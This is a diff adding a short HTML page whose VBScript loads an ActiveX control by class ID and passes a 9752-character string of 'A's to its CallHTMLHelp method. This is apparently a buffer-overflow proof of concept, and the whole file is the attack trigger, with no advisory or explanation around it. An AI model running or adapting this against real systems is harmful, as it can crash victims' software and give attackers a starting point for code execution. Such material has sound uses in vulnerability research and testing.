@@ -1,0 +1,10 @@
+<html><body>
+
+<object id=target classid=clsid:2646205B-878C-11D1-B07C-0000C040BCDB></object>
+<script language=vbscript>
+
+arg1=String(9752, "A")
+target.CallHTMLHelp arg1
+
+</script>
+</body></html>
